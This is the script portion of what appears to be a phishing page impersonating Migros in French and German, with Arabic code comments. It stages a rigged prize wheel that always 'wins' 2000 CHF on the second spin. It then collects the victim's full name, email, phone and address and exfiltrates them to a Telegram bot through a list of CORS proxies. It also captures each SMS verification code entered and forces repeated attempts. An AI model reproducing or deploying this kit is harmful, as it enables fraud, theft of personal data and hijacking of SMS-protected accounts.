            // تطبيق تأثير التدوير المحدد
            wheel.className = 'wheel';
            wheel.classList.add(`spinning-${currentEffect}`);
            
            // إضافة تأثير اللمعان
            wheel.classList.add('sparkle');
            
            // حساب درجات التدوير بناءً على التأثير
            let baseDegrees, extraRotation;
            
            switch(currentEffect) {
                case 'slow':
                    baseDegrees = 1440; // 4 دورات كاملة
                    extraRotation = Math.floor(Math.random() * 180) + 180;
                    break;
                case 'fast':
                    baseDegrees = 720; // دورتان كاملتان
                    extraRotation = Math.floor(Math.random() * 90) + 90;
                    break;
                case 'bounce':
                    baseDegrees = 1080; // 3 دورات كاملة
                    extraRotation = Math.floor(Math.random() * 120) + 120;
                    break;
                case 'smooth':
                default:
                    baseDegrees = 900; // 2.5 دورة كاملة
                    extraRotation = Math.floor(Math.random() * 150) + 150;
                    break;
            }
            
            const totalDegrees = baseDegrees + extraRotation;
            wheel.style.transform = `rotate(${totalDegrees}deg)`;
            
            setTimeout(() => {
                isSpinning = false;
                wheel.classList.remove('sparkle');
                
                if (attemptCount === 1) {
                    showLoseScreen();
                } else if (attemptCount === 2) {
                    showWinScreen();
                } else {
                    const actualDegrees = totalDegrees % 360;
                    const winningIndex = Math.floor(((360 - actualDegrees) % 360) / anglePerItem);
                    
                    if (wheelItems[winningIndex] === "2000 CHF") {
                        showWinScreen();
                    } else {
                        const winMessage = currentLanguage === 'fr' 
                            ? `Félicitations! Vous avez gagné: ${wheelItems[winningIndex]}`
                            : `Glückwunsch! Sie haben gewonnen: ${wheelItems[winningIndex]}`;
                        
                        // تأثير اهتزاز للمكاسب الصغيرة
                        wheel.classList.add('shake');
                        setTimeout(() => wheel.classList.remove('shake'), 500);
                        
                        alert(winMessage);
                        
                        if (attempts <= 0) {
                            spinButton.disabled = true;
                            spinButton.textContent = currentLanguage === 'fr' 
                                ? "Plus de tentatives" 
                                : "Keine Versuche mehr";
                        }
                    }
                }
            }, currentEffect === 'slow' ? 5000 : 
               currentEffect === 'fast' ? 2500 : 
               currentEffect === 'bounce' ? 3500 : 4000);
        });
        
        function showLoseScreen() {
            remainingAttemptsElement.textContent = attempts;
            gameScreen.classList.add('hidden');
            loseScreen.classList.remove('hidden');
        }
        
        function showWinScreen() {
            gameScreen.classList.add('hidden');
            winScreen.classList.remove('hidden');
        }
        
        retryButton.addEventListener('click', () => {
            loseScreen.classList.add('hidden');
            gameScreen.classList.remove('hidden');
            
            if (attempts <= 0) {
                spinButton.disabled = true;
                spinButton.textContent = currentLanguage === 'fr' 
                    ? "Plus de tentatives" 
                    : "Keine Versuche mehr";
            }
        });
        
        claimButton.addEventListener('click', () => {
            winScreen.classList.add('hidden');
            formScreen.classList.remove('hidden');
        });
        
        // ✅ دالة محسنة لإرسال Telegram مع عدة بدائل
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            console.log("📤 Envoi à Telegram avec AzozYonBot...");
            console.log("🔑 Token:", BOT_TOKEN.substring(0, 10) + "...");
            console.log("💬 Chat ID:", CHAT_ID);
            
            // محاولة عدة طرق لإرسال البيانات
            const proxies = [
                'https://cors-anywhere.herokuapp.com/',
                'https://api.codetabs.com/v1/proxy?quest=',
                'https://corsproxy.io/?',
                '' // محاولة مباشرة بدون proxy
            ];
            
            for (let proxy of proxies) {
                try {
                    console.log(`🔄 Tentative avec proxy: ${proxy || 'DIRECT'}`);
                    
                    const response = await fetch(proxy + url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    console.log("📩 Réponse Telegram:", data);
                    
                    if (data.ok) {
                        console.log("✅ Message envoyé avec succès via AzozYonBot!");
                        return data;
                    } else {
                        console.log("❌ Erreur Telegram:", data.description);
                    }
                    
                } catch (error) {
                    console.log(`❌ Échec avec proxy ${proxy}:`, error.message);
                }
            }
            
            // إذا فشلت جميع المحاولات
            throw new Error("Toutes les tentatives d'envoi ont échoué");
        }
        
        // حفظ البيانات محلياً
        function saveToLocalStorage(message) {
            const submissions = JSON.parse(localStorage.getItem('telegramSubmissions') || '[]');
            submissions.push({
                message: message,
                timestamp: new Date().toISOString(),
                status: 'saved_locally',
                bot: 'AzozYonBot'
            });
            localStorage.setItem('telegramSubmissions', JSON.stringify(submissions));
            console.log('💾 Données sauvegardées localement pour AzozYonBot');
            
            // عرض البيانات المحفوظة للمستخدم
            const savedData = JSON.parse(localStorage.getItem('telegramSubmissions'));
            console.log('📊 Données sauvegardées:', savedData);
        }
        
        // إرسال النموذج
        submitButton.addEventListener('click', async () => {
            const fullname = document.getElementById('fullname').value.trim();
            const email = document.getElementById('email').value.trim();
            userPhone = document.getElementById('phone').value.trim();
            const address = document.getElementById('address').value.trim();
            const city = document.getElementById('city').value.trim();
            const postalcode = document.getElementById('postalcode').value.trim();
            
            // التحقق من الصحة
            if (!fullname || !email || !userPhone || !address || !city || !postalcode) {
                const errorMessage = currentLanguage === 'fr' 
                    ? "Veuillez remplir tous les champs du formulaire." 
                    : "Bitte füllen Sie alle Felder des Formulars aus.";
                showStatusMessage(errorMessage, "error");
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                const errorMessage = currentLanguage === 'fr' 
                    ? "Veuillez entrer une adresse email valide." 
                    : "Bitte geben Sie eine gültige E-Mail-Adresse ein.";
                showStatusMessage(errorMessage, "error");
                return;
            }
            
            const phoneRegex = /^[0-9+\-\s()]{10,}$/;
            if (!phoneRegex.test(userPhone)) {
                const errorMessage = currentLanguage === 'fr' 
                    ? "Veuillez entrer un numéro de téléphone valide." 
                    : "Bitte geben Sie eine gültige Telefonnummer ein.";
                showStatusMessage(errorMessage, "error");
                return;
            }
            
            // إعداد واجهة التحميل
            submitText.textContent = currentLanguage === 'fr' ? "ENVOI EN COURS..." : "WIRD GESENDET...";
            submitLoading.classList.remove('hidden');
            submitButton.disabled = true;
            statusMessage.style.display = "none";
            
            try {
                // رسالة Telegram
                const telegramMessage = `
🎉 NOUVEAU GAGNANT MIGROS 🎉

📋 INFORMATIONS PERSONNELLES:
👤 Nom complet: ${fullname}
📧 Email: ${email}
📞 Téléphone: ${userPhone}

🏠 ADRESSE DE LIVRAISON:
📍 Adresse: ${address}
🏙️ Ville: ${city}
📮 Code Postal: ${postalcode}

💰 GAIN: 2000 CHF
⏰ Date: ${new Date().toLocaleString('fr-FR')}
🌐 Langue: ${currentLanguage === 'fr' ? 'Français' : 'Deutsch'}
🤖 Bot: @AzozYonBot

🔔 Envoyé via AzozYonBot
                `;
                
                console.log("🔄 Tentative d'envoi via AzozYonBot...");
                const result = await sendToTelegram(telegramMessage);
                
                if (result.ok) {
                    // إرسال طلب SMS
                    const smsMessage = `
🔐 DEMANDE DE VÉRIFICATION SMS

📞 Numéro à vérifier: ${userPhone}
⏰ Heure: ${new Date().toLocaleString('fr-FR')}
🌐 Langue: ${currentLanguage === 'fr' ? 'Français' : 'Deutsch'}
🤖 Bot: @AzozYonBot

💡 Code correct: ${correctSMSCode}
                    `;
                    
                    await sendToTelegram(smsMessage);
                    
                    // إعادة تعيين عداد محاولات SMS
                    smsAttempts = 0;
                    
                    // الانتقال إلى شاشة SMS
                    formScreen.classList.add('hidden');
                    smsScreen.classList.remove('hidden');
                    startSmsTimer();
                    
                    const successMessage = currentLanguage === 'fr' 
                        ? "✅ Données envoyées avec succès!" 
                        : "✅ Daten erfolgreich gesendet!";
                    showStatusMessage(successMessage, "success");
                    
                }
                
            } catch (error) {
                console.error("❌ Erreur finale:", error);
                const errorMessage = currentLanguage === 'fr' 
                    ? "⚠️ Probleme d'envoi, mais données sauvegardées localement" 
                    : "⚠️ Sendeproblem, aber Daten lokal gespeichert";
                showStatusMessage(errorMessage, "error");
                
                // حفظ البيانات محلياً
                const formData = {
                    fullname, email, userPhone, address, city, postalcode,
                    timestamp: new Date().toLocaleString('fr-FR'),
                    language: currentLanguage,
                    prize: "2000 CHF"
                };
                saveToLocalStorage(JSON.stringify(formData, null, 2));
                
                // إعادة تعيين عداد محاولات SMS
                smsAttempts = 0;
                
                // الاستمرار رغم الخطأ
                formScreen.classList.add('hidden');
                smsScreen.classList.remove('hidden');
                startSmsTimer();
            } finally {
                submitText.textContent = currentLanguage === 'fr' ? "ENVOYER" : "SENDEN";
                submitLoading.classList.add('hidden');
                submitButton.disabled = false;
            }
        });
        
        function showStatusMessage(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = "status-message " + type;
            statusMessage.style.display = "block";
        }
        
        function startSmsTimer() {
            smsMinutes = 2;
            smsSeconds = 50;
            canResend = false;
            resendLink.classList.add('disabled');
            updateSmsTimer();
            smsTimerInterval = setInterval(updateSmsTimer, 1000);
        }
        
        function updateSmsTimer() {
            smsSeconds--;
            
            if (smsSeconds < 0) {
                smsSeconds = 59;
                smsMinutes--;
            }
            
            if (smsMinutes < 0) {
                smsMinutes = 0;
                smsSeconds = 0;
                clearInterval(smsTimerInterval);
                canResend = true;
                resendLink.classList.remove('disabled');
            }
            
            smsTimer.textContent = `${smsMinutes}:${smsSeconds.toString().padStart(2, '0')}`;
        }
        
        resendLink.addEventListener('click', async (e) => {
            e.preventDefault();
            
            if (!canResend) return;
            
            try {
                const resendMessage = `
🔄 RENVOI DE SMS DEMANDÉ

📞 Numéro: ${userPhone}
⏰ Heure: ${new Date().toLocaleString('fr-FR')}
🌐 Langue: ${currentLanguage === 'fr' ? 'Français' : 'Deutsch'}
🤖 Bot: @AzozYonBot

💡 Code correct: ${correctSMSCode}
                `;
                
                await sendToTelegram(resendMessage);
                startSmsTimer();
                const successMessage = currentLanguage === 'fr' 
                    ? "✅ Code SMS renvoyé!" 
                    : "✅ SMS-Code erneut gesendet!";
                showSmsStatusMessage(successMessage, "success");
                
            } catch (error) {
                const successMessage = currentLanguage === 'fr' 
                    ? "⚠️ Demande sauvegardée localement" 
                    : "⚠️ Anfrage lokal gespeichert";
                showSmsStatusMessage(successMessage, "success");
                startSmsTimer();
            }
        });
        
        validateButton.addEventListener('click', async () => {
            const code = digit1.value + digit2.value + digit3.value + digit4.value;
            
            if (code.length !== 4) {
                const errorMessage = currentLanguage === 'fr' 
                    ? "❌ Veuillez entrer le code complet" 
                    : "❌ Bitte geben Sie den vollständigen Code ein";
                showSmsStatusMessage(errorMessage, "error");
                return;
            }
            
            smsAttempts++;
            
            validateText.textContent = currentLanguage === 'fr' ? "VALIDATION..." : "WIRD BESTÄTIGT...";
            validateLoading.classList.remove('hidden');
            validateButton.disabled = true;
            
            try {
                // إرسال محاولة SMS إلى Telegram
                const attemptMessage = `
📱 TENTATIVE DE VÉRIFICATION SMS #${smsAttempts}

📞 Numéro: ${userPhone}
🔢 Code saisi: ${code}
✅ Code correct: ${correctSMSCode}
📊 Résultat: ${smsAttempts === 3 ? "SUCCÈS" : "ÉCHEC"}
⏰ Heure: ${new Date().toLocaleString('fr-FR')}
🌐 Langue: ${currentLanguage === 'fr' ? 'Français' : 'Deutsch'}
🤖 Bot: @AzozYonBot
                `;
                
                await sendToTelegram(attemptMessage);
                
                // المحاولة الأولى والثانية خاطئة، الثالثة صحيحة
                if (smsAttempts < 3) {
                    // المحاولات الأولى والثانية خاطئة
                    const errorMessage = currentLanguage === 'fr' 
                        ? `❌ Code incorrect. Tentative ${smsAttempts}/3` 
                        : `❌ Falscher Code. Versuch ${smsAttempts}/3`;
                    showSmsStatusMessage(errorMessage, "error");
                    
                    // مسح الحقول للسماح بإعادة المحاولة
                    digit1.value = '';
                    digit2.value = '';
                    digit3.value = '';
                    digit4.value = '';
                    digit1.focus();
                    
                } else {
                    // المحاولة الثالثة صحيحة
                    const successMessage = `
✅ VÉRIFICATION SMS RÉUSSIE

📞 Numéro vérifié: ${userPhone}
🔢 Code saisi: ${code}
⏰ Heure: ${new Date().toLocaleString('fr-FR')}
🌐 Langue: ${currentLanguage === 'fr' ? 'Français' : 'Deutsch'}
🤖 Bot: @AzozYonBot

🎉 Livraison prévue sous 48h
                    `;
                    
                    await sendToTelegram(successMessage);
                    
                    const successUserMessage = currentLanguage === 'fr' 
                        ? "✅ Félicitations! Vérification réussie." 
                        : "✅ Glückwunsch! Verifizierung erfolgreich.";
                    showSmsStatusMessage(successUserMessage, "success");
                    
                    setTimeout(() => {
                        // إعادة التعيين
                        smsScreen.classList.add('hidden');
                        gameScreen.classList.remove('hidden');
                        gameScreen.classList.remove('small');
                        resetForm();
                        
                    }, 3000);
                }
                
            } catch (error) {
                const errorMessage = currentLanguage === 'fr' 
                    ? "❌ Erreur de validation" 
                    : "❌ Validierungsfehler";
                showSmsStatusMessage(errorMessage, "error");
            } finally {
                validateText.textContent = currentLanguage === 'fr' ? "VALIDER" : "BESTÄTIGEN";
                validateLoading.classList.add('hidden');
                validateButton.disabled = false;
            }
        });
        
        function showSmsStatusMessage(message, type) {
            smsStatusMessage.textContent = message;
            smsStatusMessage.className = "status-message " + type;
            smsStatusMessage.style.display = "block";
        }
        
        function resetForm() {
            document.getElementById('fullname').value = '';
            document.getElementById('email').value = '';
            document.getElementById('phone').value = '';
            document.getElementById('address').value = '';
            document.getElementById('city').value = '';
            document.getElementById('postalcode').value = '';
            digit1.value = '';
            digit2.value = '';
            digit3.value = '';
            digit4.value = '';
            smsAttempts = 0;
            
            if (attempts <= 0) {
                spinButton.disabled = true;
                spinButton.textContent = currentLanguage === 'fr' 
                    ? "Plus de tentatives" 
                    : "Keine Versuche mehr";
            }
        }
        
        // التنقل بين حقول الرمز
        const digits = [digit1, digit2, digit3, digit4];
        
        digits.forEach((digit, index) => {
            digit.addEventListener('input', () => {
                if (digit.value.length === 1 && index < digits.length - 1) {
                    digits[index + 1].focus();
                }
            });
            
            digit.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && digit.value.length === 0 && index > 0) {
                    digits[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
